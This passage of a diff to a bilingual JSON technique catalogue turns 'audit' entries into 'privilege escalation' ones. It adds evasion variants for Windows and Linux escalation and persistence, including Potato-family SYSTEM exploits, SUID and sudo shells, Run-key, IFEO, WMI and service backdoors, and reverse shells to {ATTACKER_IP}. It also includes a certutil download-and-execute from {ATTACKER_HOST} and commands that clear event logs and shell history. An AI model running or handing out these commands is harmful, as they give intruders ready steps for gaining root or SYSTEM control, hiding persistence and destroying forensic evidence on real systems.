+            "en": "Hijacks a resident signed binary so payload rides its whitelisted process. Success: OneDrive.exe child calls back."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：ACL 修改最小化",
+            "en": "Evasion: minimal ACL change"
+          },
+          "command": "icacls \"C:\\\\Program Files\\\\VulnerableApp\" /grant \"Users:(OI)(CI)W\" /t",
+          "description": {
+            "zh": "规避点：只授予写权限而非完全控制，减少 ACL 审计差异。判据：普通用户可写但审计项更少。",
+            "en": "Grants write-only instead of full control to shrink the audit delta. Success: user can write with fewer audit flags."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：事后痕迹还原",
+            "en": "Evasion: post-run restore"
+          },
+          "command": "del \"C:\\\\Program Files\\\\VulnerableApp\\\\missing.dll\"\nicacls \"C:\\\\Program Files\\\\VulnerableApp\" /remove \"Users\" /t",
+          "description": {
+            "zh": "规避点：删除劫持 DLL 并回滚 ACL 变更。判据：目录回到初始权限且无残留文件。",
+            "en": "Removes the DLL and reverts ACL changes. Success: directory back to baseline with no leftovers."
+          }
+        }
+      ]
     },
     {
       "id": "service-exploit",
@@ -3455,8 +4398,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "Windows 服务 ACL 与路径审计",
-        "en": "Windows Service ACL and Path Audit"
+        "zh": "Windows 提权",
+        "en": "Windows Privilege Escalation"
       },
       "prerequisites": [
         {
@@ -3560,7 +4503,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：注册表直改 ImagePath",
+            "en": "Evasion: registry ImagePath edit"
+          },
+          "command": "reg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\{LAB_SERVICE} /v ImagePath /t REG_EXPAND_SZ /d \"cmd /c whoami > C:\\\\Windows\\\\temp\\\\s.txt\" /f\nsc stop {LAB_SERVICE}\nsc start {LAB_SERVICE}",
+          "description": {
+            "zh": "规避点：绕过 sc.exe 命令行审计，直接改注册表。判据：服务重启后 s.txt 生成。",
+            "en": "Edits the registry directly to avoid sc.exe command-line auditing. Success: s.txt created after service restart."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：编码命令规避审计",
+            "en": "Evasion: encoded command line"
+          },
+          "command": "sc config {LAB_SERVICE} binPath= \"cmd /c powershell -e {LAB_BASE64_COMMAND}\"",
+          "description": {
+            "zh": "规避点：base64 参数避免明文命令进入日志。判据：日志中无明文、命令仍执行。",
+            "en": "Base64 keeps plaintext commands out of logs. Success: no plaintext logged yet command runs."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：服务失败恢复劫持",
+            "en": "Evasion: failure-recovery hijack"
+          },
+          "command": "sc failure {LAB_SERVICE} command= \"cmd /c whoami > C:\\\\Windows\\\\temp\\\\f.txt\"\nsc stop {LAB_SERVICE}",
+          "description": {
+            "zh": "规避点：不改 binPath，改失败恢复命令这一低频审计面。判据：服务崩溃后 f.txt 生成。",
+            "en": "Modifies the rarely audited failure-recovery command instead of binPath. Success: f.txt created after crash."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：原始路径还原",
+            "en": "Evasion: restore original path"
+          },
+          "command": "sc query {LAB_SERVICE} > nul\nreg query HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\{LAB_SERVICE} /v ImagePath.orig",
+          "description": {
+            "zh": "规避点：利用预留 .orig 值快速还原，缩短异常窗口。判据：ImagePath 恢复原始值。",
+            "en": "Uses a stashed .orig value to restore quickly. Success: ImagePath back to original."
+          }
+        }
+      ]
     },
     {
       "id": "always-install",
@@ -3577,8 +4566,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "AlwaysInstallElevated 策略审计",
-        "en": "AlwaysInstallElevated Policy Audit"
+        "zh": "Windows 提权",
+        "en": "Windows Privilege Escalation"
       },
       "prerequisites": [
         {
@@ -3682,7 +4671,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：WMI 静默安装",
+            "en": "Evasion: WMI silent install"
+          },
+          "command": "powershell -nop -c \"(Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation='C:\\\\Windows\\\\temp\\\\evil.msi'}).ReturnValue\"",
+          "description": {
+            "zh": "规避点：以 WMI 替代 msiexec.exe 进程链，绕过针对 msiexec 的监控。判据：返回 0 且载荷执行。",
+            "en": "WMI replaces the msiexec.exe process chain. Success: ReturnValue 0 and payload runs."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：本地账户免外联载荷",
+            "en": "Evasion: no-egress local payload"
+          },
+          "command": "msfvenom -p windows/x64/exec CMD='net localgroup administrators eva /add' -f msi > evil.msi\nmsiexec /quiet /qn /i evil.msi",
+          "description": {
+            "zh": "规避点：改用本地加组命令，避免 reverse_tcp 外联触发流量告警。判据：eva 出现在管理员组。",
+            "en": "Local group-add avoids reverse traffic alerts. Success: eva appears in administrators."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：日志抑制安装",
+            "en": "Evasion: suppressed logging install"
+          },
+          "command": "msiexec /i evil.msi /qn /norestart /l*n nul:",
+          "description": {
+            "zh": "规避点：日志重定向 nul 抑制 msi 详细日志。判据：安装成功且无日志文件生成。",
+            "en": "Redirects MSI logging to nul. Success: install completes with no log file."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：装后即卸清理",
+            "en": "Evasion: install-then-uninstall cleanup"
+          },
+          "command": "msiexec /x evil.msi /qn\ndel C:\\\\Windows\\\\temp\\\\evil.msi",
+          "description": {
+            "zh": "规避点：卸载移除安装记录并删除介质。判据：已安装程序列表与目录均无痕迹。",
+            "en": "Uninstall removes the registration and the media is deleted. Success: no trace in installed programs or disk."
+          }
+        }
+      ]
     },
     {
       "id": "juicy-potato",
@@ -3699,8 +4734,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "JuicyPotato 适用条件审计",
-        "en": "JuicyPotato Prerequisite Audit"
+        "zh": "Potato 家族与令牌模拟",
+        "en": "Potato Family & Token Impersonation"
       },
       "prerequisites": [
         {
@@ -3800,7 +4835,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：换 CLSID 规避监控",
+            "en": "Evasion: alternate CLSID"
+          },
+          "command": "JuicyPotato.exe -l 1338 -p c:\\\\windows\\\\system32\\\\cmd.exe -t * -c {4991D34B-80A1-4291-83B6-3328366B9097}",
+          "description": {
+            "zh": "规避点：换 BITS CLSID 与非默认端口，绕过针对 PrintNotify 默认 CLSID:1337 的检测。判据：输出 SYSTEM。",
+            "en": "Switches to the BITS CLSID and a non-default port. Success: SYSTEM output."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：SweetPotato 替代",
+            "en": "Evasion: SweetPotato substitute"
+          },
+          "command": "SweetPotato.exe -p C:\\\\Windows\\\\System32\\\\cmd.exe -a \"/c whoami > C:\\\\Windows\\\\temp\\\\j.txt\"",
+          "description": {
+            "zh": "规避点：不同实现规避 JuicyPotato 哈希特征。判据：j.txt 为 SYSTEM。",
+            "en": "Different implementation evades JuicyPotato hashes. Success: j.txt shows SYSTEM."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：GodPotato 新系统适配",
+            "en": "Evasion: GodPotato for newer systems"
+          },
+          "command": "GodPotato.exe -cmd \"cmd /c whoami > C:\\\\Windows\\\\temp\\\\g.txt\"",
+          "description": {
+            "zh": "规避点：Server2019+/Win10/11 走 EfsRpc 路径不再依赖 SeImpersonate 端口监听。判据：g.txt 为 SYSTEM。",
+            "en": "EfsRpc path for newer systems with no listening port required. Success: g.txt shows SYSTEM."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：产物即清",
+            "en": "Evasion: immediate artifact removal"
+          },
+          "command": "del C:\\\\Windows\\\\temp\\\\*.txt & wevtutil cl System",
+          "description": {
+            "zh": "规避点：清除输出文件与系统日志。判据：temp 无残留、System 日志清空。",
+            "en": "Removes outputs and clears the system log. Success: no temp leftovers, System log empty."
+          }
+        }
+      ]
     },
     {
       "id": "printspoofer",
@@ -3817,8 +4898,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "PrintSpoofer 适用条件审计",
-        "en": "PrintSpoofer Prerequisite Audit"
+        "zh": "Potato 家族与令牌模拟",
+        "en": "Potato Family & Token Impersonation"
       },
       "prerequisites": [
         {
@@ -3918,7 +4999,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：直连反弹免文件",
+            "en": "Evasion: direct reverse without files"
+          },
+          "command": "PrintSpoofer.exe -c \"cmd /c C:\\\\Windows\\\\temp\\\\nc.exe -e cmd.exe {ATTACKER_IP} {LPORT}\"",
+          "description": {
+            "zh": "规避点：直接反弹替代落盘输出，减少文件残留。判据：攻击机收到 SYSTEM shell。",
+            "en": "Direct reverse shell instead of file output. Success: SYSTEM shell on the listener."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：GodPotato 等效路径",
+            "en": "Evasion: GodPotato equivalent path"
+          },
+          "command": "GodPotato.exe -cmd \"cmd /c whoami > C:\\\\Windows\\\\temp\\\\pp.txt\"",
+          "description": {
+            "zh": "规避点：目标补丁封 PrintSpoofer 管道时切换 EfsRpc 路径。判据：pp.txt 为 SYSTEM。",
+            "en": "Switches to EfsRpc when the print pipe is patched. Success: pp.txt shows SYSTEM."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：无控制台弹窗执行",
+            "en": "Evasion: no-console execution"
+          },
+          "command": "PrintSpoofer.exe -i -c \"cmd /c whoami > C:\\\\Windows\\\\temp\\\\q.txt\"",
+          "description": {
+            "zh": "规避点：避免交互控制台弹窗惊动用户，改文件输出。判据：q.txt 生成且无窗口闪现。",
+            "en": "Avoids the interactive console popup via file output. Success: q.txt created with no visible window."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：用后清理",
+            "en": "Evasion: cleanup after use"
+          },
+          "command": "del C:\\\\Windows\\\\temp\\\\q.txt & wevtutil cl Security",
+          "description": {
+            "zh": "规避点：删除证据文件并清安全日志。判据：无残留。",
+            "en": "Deletes evidence and clears the security log. Success: nothing remains."
+          }
+        }
+      ]
     },
     {
       "id": "godpotato",
@@ -3935,8 +5062,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "GodPotato 适用条件审计",
-        "en": "GodPotato Prerequisite Audit"
+        "zh": "Potato 家族与令牌模拟",
+        "en": "Potato Family & Token Impersonation"
       },
       "prerequisites": [
         {
@@ -4036,7 +5163,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：SweetPotato EfsRpc",
+            "en": "Evasion: SweetPotato EfsRpc"
+          },
+          "command": "SweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c whoami\"",
+          "description": {
+            "zh": "规避点：同一底层路径换工具实现，规避 GodPotato 特征。判据：SYSTEM 输出。",
+            "en": "Same underlying path, different tool signature. Success: SYSTEM output."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：本地加组免外联",
+            "en": "Evasion: local group-add without egress"
+          },
+          "command": "GodPotato.exe -cmd \"cmd /c net user eva Pass123! /add && net localgroup administrators eva /add\"",
+          "description": {
+            "zh": "规避点：无外联流量直接建立持久账户。判据：eva 进入管理员组。",
+            "en": "No egress traffic; creates a persistent account. Success: eva joins administrators."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：certutil 中转下载",
+            "en": "Evasion: certutil staged download"
+          },
+          "command": "GodPotato.exe -cmd \"cmd /c certutil -urlcache -f http://{ATTACKER_HOST}/x.exe C:\\\\Windows\\\\temp\\\\x.exe && C:\\\\Windows\\\\temp\\\\x.exe\"",
+          "description": {
+            "zh": "规避点：HTTPS/certutil 中转，避免工具本体直接外联。判据：x.exe 执行回连。",
+            "en": "Stages via certutil so the potato itself never calls out. Success: x.exe runs and calls back."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：JuicyPotatoNG 新系统",
+            "en": "Evasion: JuicyPotatoNG on modern systems"
+          },
+          "command": "JuicyPotatoNG.exe -t * -p \"cmd /c whoami > C:\\\\Windows\\\\temp\\\\n.txt\"",
+          "description": {
+            "zh": "规避点：Win10/11 可用的更新实现。判据：n.txt 为 SYSTEM。",
+            "en": "Updated implementation for Win10/11. Success: n.txt shows SYSTEM."
+          }
+        }
+      ]
     },
     {
       "id": "suid-exploit",
@@ -4053,8 +5226,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "SUID 文件权限边界审计",
-        "en": "SUID File-Permission Boundary Audit"
+        "zh": "Linux 提权与内核",
+        "en": "Linux PrivEsc & Kernel"
       },
       "prerequisites": [
         {
@@ -4158,7 +5331,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：低噪声枚举",
+            "en": "Evasion: low-noise enumeration"
+          },
+          "command": "find /usr/bin /usr/sbin /bin -xdev -perm -4000 -type f -print 2>/dev/null",
+          "description": {
+            "zh": "规避点：限定目录替代全盘扫描，减少 auditd 规则命中。判据：枚举结果正常返回。",
+            "en": "Scopes the scan to reduce auditd hits. Success: enumeration returns normally."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：解释器提权替代",
+            "en": "Evasion: interpreter-based escalation"
+          },
+          "command": "python -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'",
+          "description": {
+            "zh": "规避点：SUID python 路径替代 find/vim 等高频告警二进制。判据：得到 root shell。",
+            "en": "Uses a SUID python instead of noisy find/vim paths. Success: root shell."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：perl 提权路径",
+            "en": "Evasion: perl escalation path"
+          },
+          "command": "perl -e 'setuid(0);exec(\"/bin/sh\")'",
+          "description": {
+            "zh": "规避点：SUID perl 变体扩大绕过面。判据：euid 为 0。",
+            "en": "SUID perl variant widens coverage. Success: euid 0."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：无痕 shell 环境",
+            "en": "Evasion: traceless shell environment"
+          },
+          "command": "exec /bin/sh -p\nunset HISTFILE HISTSIZE; export HISTSIZE=0; history -c",
+          "description": {
+            "zh": "规避点：exec 替换进程避免父子树检测并清历史。判据：无 history 记录且 shell 可用。",
+            "en": "exec replaces the process tree and clears history. Success: shell works with no history records."
+          }
+        }
+      ]
     },
     {
       "id": "sudo-exploit",
@@ -4175,8 +5394,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "Sudoers 最小权限审计",
-        "en": "Sudoers Least-Privilege Audit"
+        "zh": "Linux 提权与内核",
+        "en": "Linux PrivEsc & Kernel"
       },
       "prerequisites": [
         {
@@ -4280,7 +5499,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：CVE-2019-14287 用户号绕过",
+            "en": "Evasion: CVE-2019-14287 uid trick"
+          },
+          "command": "sudo -u#-1 /bin/sh",
+          "description": {
+            "zh": "规避点：sudo<1.8.28 以 #uid=-1 语法绕过用户白名单。判据：直接得到 root shell。",
+            "en": "Exploits the -1 uid parsing to bypass allowlists on old sudo. Success: root shell."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：env 链式提权",
+            "en": "Evasion: env chaining"
+          },
+          "command": "sudo env /bin/sh",
+          "description": {
+            "zh": "规避点：sudoers 授权 env 时以环境执行器转 shell，命令行无 vim/find 特征。判据：root shell。",
+            "en": "env is allowed, spawns a shell without classic GTFOBins signatures. Success: root shell."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：less 读密 + shell",
+            "en": "Evasion: less read plus shell"
+          },
+          "command": "sudo less /etc/shadow\n!sh",
+          "description": {
+            "zh": "规避点：以阅读密文件为掩护进入 pager 后执行 !sh。判据：显示哈希并得到 shell。",
+            "en": "Reading shadow as cover, then !sh inside the pager. Success: hashes shown and shell obtained."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：静默授权探测",
+            "en": "Evasion: silent sudo probing"
+          },
+          "command": "sudo -n -l 2>&1 | grep -E \"NOPASSWD|\\(ALL\\)\"",
+          "description": {
+            "zh": "规避点：-n 免密码提示、管道过滤减少输出曝光。判据：列出可免密命令。",
+            "en": "Non-interactive probe with filtered output. Success: passwordless commands listed."
+          }
+        }
+      ]
     },
     {
       "id": "cron-exploit",
@@ -4297,8 +5562,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "Cron 所有权与可写路径审计",
-        "en": "Cron Ownership and Writable-Path Audit"
+        "zh": "Linux 提权与内核",
+        "en": "Linux PrivEsc & Kernel"
       },
       "prerequisites": [
         {
@@ -4402,7 +5667,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：通配符注入提权",
+            "en": "Evasion: wildcard injection"
+          },
+          "command": "echo '/bin/bash -i >& /dev/tcp/{ATTACKER_IP}/{LPORT} 0>&1' > /tmp/r.sh\ntouch '/tmp/--checkpoint=1' '/tmp/--checkpoint-action=exec=sh /tmp/r.sh'",
+          "description": {
+            "zh": "规避点：tar 通配符注入不修改 cron 定义本身，绕过 crontab 监控。判据：收到 root shell。",
+            "en": "Wildcard injection never touches the cron definition. Success: root shell arrives."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：PATH 劫持",
+            "en": "Evasion: PATH hijack"
+          },
+          "command": "echo '#!/bin/bash\\n/bin/bash -i >& /dev/tcp/{ATTACKER_IP}/{LPORT} 0>&1' > /tmp/backup\nchmod +x /tmp/backup",
+          "description": {
+            "zh": "规避点：覆盖 cron 脚本调用的无路径命令，不改脚本本体。判据：定时触发回连。",
+            "en": "Shadows an unqualified command instead of editing the script. Success: scheduled callback."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：cron.d 注入持久化",
+            "en": "Evasion: cron.d persistence"
+          },
+          "command": "echo '* * * * * root /tmp/x' > /etc/cron.d/persist && chmod 644 /etc/cron.d/persist",
+          "description": {
+            "zh": "规避点：独立文件持久化不篡改既有 crontab，降低 diff 告警。判据：每分钟以 root 执行 /tmp/x。",
+            "en": "A separate file avoids modifying existing crontabs. Success: /tmp/x runs as root every minute."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：痕迹清理",
+            "en": "Evasion: trace cleanup"
+          },
+          "command": "rm -f /tmp/x /tmp/r.sh /tmp/backup /etc/cron.d/persist && sed -i '/x/d' /etc/crontab && history -c",
+          "description": {
+            "zh": "规避点：删除载荷与注入项并清历史。判据：相关文件与条目全部消失。",
+            "en": "Removes payloads, injected entries, and history. Success: all artifacts gone."
+          }
+        }
+      ]
     },
     {
       "id": "persistence-registry",
@@ -4419,8 +5730,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "注册表启动项持久化审计",
-        "en": "Registry Startup Persistence Audit"
+        "zh": "自启动与计划任务",
+        "en": "Autostart & Scheduled Tasks"
       },
       "prerequisites": [
         {
@@ -4538,7 +5849,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "PowerShell 原生写键",
+            "en": "PowerShell Native Write"
+          },
+          "command": "powershell -NoProfile -Command \"New-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Updater -Value 'C:\\Users\\Public\\backdoor.exe' -PropertyType String -Force\"",
+          "description": {
+            "zh": "规避 reg.exe 命令行审计：PowerShell 注册表提供程序写 Run 键；键值查询回显即驻留生效。",
+            "en": "Write the Run key via the PowerShell registry provider to avoid reg.exe command-line auditing; the value echoing on query confirms persistence."
+          }
+        },
+        {
+          "title": {
+            "zh": "RunOnce 一次性驻留",
+            "en": "RunOnce One-Shot Persistence"
+          },
+          "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v OneDriveCleanup /t REG_SZ /d \"cmd /c C:\\Users\\Public\\backdoor.exe\"",
+          "description": {
+            "zh": "以 RunOnce 替代 Run 降低常规自启清单命中率；重启后执行并自清键即成功。",
+            "en": "Use RunOnce instead of Run to fall outside routine autostart inventories; execution after reboot with the key self-clearing confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "IFEO 调试器劫持",
+            "en": "IFEO Debugger Hijack"
+          },
+          "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Users\\Public\\backdoor.exe\"",
+          "description": {
+            "zh": "绕过对 Run/RunOnce 键的专门监控：劫持辅助程序调试器键实现触发；连按五次 Shift 拉起程序即成功。",
+            "en": "Hijack an accessibility binary's debugger key to sidestep Run-key-specific monitoring; the program launching via the trigger confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "登录脚本环境变量",
+            "en": "Logon-Script Environment Key"
+          },
+          "command": "reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"C:\\Users\\Public\\backdoor.exe\"",
+          "description": {
+            "zh": "绕过 HKLM 域级审计：HKCU 登录脚本键在用户上下文静默执行；登录后进程出现即成功。",
+            "en": "Persist via the HKCU logon-script key outside HKLM domain auditing; the process appearing after logon confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "persistence-wmi",
@@ -4555,8 +5912,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "WMI 永久事件订阅审计",
-        "en": "WMI Permanent Event-Subscription Audit"
+        "zh": "代码级植入与注入",
+        "en": "Code-level Implants & Injection"
       },
       "prerequisites": [
         {
@@ -4660,7 +6017,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "wmic 原生命令行订阅",
+            "en": "wmic Native Subscription CLI"
+          },
+          "command": "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"WindowsUpdate\",EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\",Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'\"\nwmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name=\"WindowsUpdate\",CommandLineTemplate=\"cmd /c C:\\Users\\Public\\backdoor.exe\"\nwmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name='WindowsUpdate'\",Consumer=\"CommandLineEventConsumer.Name='WindowsUpdate'\"",
+          "description": {
+            "zh": "规避 PowerShell Set-WmiInstance 脚本块日志：原生 wmic 三段式建订阅；绑定创建成功即驻留就绪。",
+            "en": "Build the subscription with native wmic three-parter to avoid PowerShell script-block logs; the binding creation completes the persistence."
+          }
+        },
+        {
+          "title": {
+            "zh": "MOF 编译植入",
+            "en": "MOF Compilation Implant"
+          },
+          "command": "mofcomp C:\\Windows\\Temp\\evil.mof",
+          "description": {
+            "zh": "把事件订阅写进托管对象格式由编译器装载：绕过对 Set-WmiInstance 调用的检测；返回 success 且事件触发即成功。",
+            "en": "Compile a Managed Object Format file to load the subscription, bypassing Set-WmiInstance detection; success plus event triggering confirms it."
+          }
+        },
+        {
+          "title": {
+            "zh": "WMI 类实例 PowerShell 变体",
+            "en": "WMI Class-Instance PowerShell Variant"
+          },
+          "command": "powershell -NoProfile -Command \"$f=([wmiclass]'root\\subscription:__EventFilter').CreateInstance();$f.Name='WindowsUpdate';$f.QueryLanguage='WQL';$f.Query=\\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'\\\";$f.Put()\"",
+          "description": {
+            "zh": "以 [wmiclass] 原生类型替代 Set-WmiInstance cmdlet 特征；对象路径返回即订阅写入。",
+            "en": "Create the filter via the native [wmiclass] type instead of the Set-WmiInstance cmdlet; a returned object path confirms the subscription write."
+          }
+        }
+      ]
     },
     {
       "id": "persistence-startup",
@@ -4677,8 +6069,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "启动文件夹持久化审计",
-        "en": "Startup-Folder Persistence Audit"
+        "zh": "自启动与计划任务",
+        "en": "Autostart & Scheduled Tasks"
       },
       "prerequisites": [
         {
@@ -4778,7 +6170,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "COM 建快捷方式",
+            "en": "COM Shortcut Creation"
+          },
+          "command": "powershell -NoProfile -Command \"$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\\\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk\\\");$s.TargetPath='C:\\Users\\Public\\backdoor.exe';$s.WindowStyle=7;$s.Save()\"",
+          "description": {
+            "zh": "规避对 copy 落文件的监控：COM 对象生成伪装名快捷方式且隐藏窗口；lnk 出现在启动目录即成功。",
+            "en": "Generate a masquerading hidden-window shortcut via COM instead of file copies; the .lnk appearing in Startup confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "隐藏属性伪装副本",
+            "en": "Hidden Attribute Masquerade Copy"
+          },
+          "command": "copy backdoor.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveSync.exe\" & attrib +h \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveSync.exe\"",
+          "description": {
+            "zh": "以系统风格命名并设置隐藏属性降低目视排查率；文件存在且登录触发即成功。",
+            "en": "Use a system-style name plus hidden attribute to reduce visual triage; the file existing and firing at logon confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "全局启动目录落位",
+            "en": "All-Users Startup Placement"
+          },
+          "command": "copy backdoor.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\svchost32.exe\"",
+          "description": {
+            "zh": "绕过按用户 Profile 路径的监控：落全局启动目录覆盖所有账户；任意用户登录后进程出现即成功。",
+            "en": "Drop into the all-users Startup directory past per-profile monitoring; the process appearing for any user logon confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "persistence-service",
@@ -4795,8 +6222,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "服务持久化配置审计",
-        "en": "Service Persistence Configuration Audit"
+        "zh": "自启动与计划任务",
+        "en": "Autostart & Scheduled Tasks"
       },
       "prerequisites": [
         {
@@ -4900,7 +6327,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "PowerShell New-Service 原生",
+            "en": "PowerShell New-Service Native"
+          },
+          "command": "powershell -NoProfile -Command \"New-Service -Name 'SysUpdate' -BinaryPathName 'cmd /c powershell -e {LAB_BASE64_COMMAND}' -StartupType Automatic -Description 'Windows system update helper'\"",
+          "description": {
+            "zh": "规避 sc.exe 命令行审计并以描述伪装：服务创建成功且自启动即驻留生效。",
+            "en": "Create the service via PowerShell with a decoy description past sc.exe auditing; creation with automatic startup confirms persistence."
+          }
+        },
+        {
+          "title": {
+            "zh": "现有服务 ImagePath 劫持",
+            "en": "Existing Service ImagePath Hijack"
+          },
+          "command": "sc config wuauserv binPath= \"cmd /c powershell -e {LAB_BASE64_COMMAND}\"",
+          "description": {
+            "zh": "不新建对象只改既有服务路径：绕过新增服务审计；服务重启后执行载荷即成功。",
+            "en": "Modify an existing service's ImagePath instead of creating one, evading new-object auditing; the payload running on service restart confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "长名伪装系统服务",
+            "en": "Long-Name Masqueraded Service"
+          },
+          "command": "sc create \"WindowsRemoteManagementUpdater\" binPath= \"cmd /c powershell -e {LAB_BASE64_COMMAND}\" start= auto DisplayName= \"Windows Remote Management Updater\"",
+          "description": {
+            "zh": "系统风格长名与显示名降低运维目视告警；服务列表出现且 start= auto 即成功。",
+            "en": "A system-style long name lowers visual triage alerts; the service listed with automatic start confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "persistence-dll-injection",
@@ -4917,8 +6379,8 @@
         "en": "Persistence Control and Detection"
       },
       "subCategory": {
-        "zh": "AppInit 与模块注入持久化审计",
-        "en": "AppInit and Module-Injection Persistence Audit"
+        "zh": "代码级植入与注入",
+        "en": "Code-level Implants & Injection"
       },
       "prerequisites": [
         {
@@ -5022,7 +6484,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "rundll32 加载执行",
+            "en": "rundll32 Load Execution"
+          },
+          "command": "rundll32 C:\\Users\\Public\\evil.dll,Start",
+          "description": {
+            "zh": "规避独立后门进程特征：借合法系统进程加载 DLL；导出函数执行副作用出现即成功。",
+            "en": "Load the DLL via the legitimate system process to avoid a standalone backdoor process; side effects of the exported function confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "签名程序目录侧加载",
+            "en": "Signed-Program Directory Sideloading"
+          },
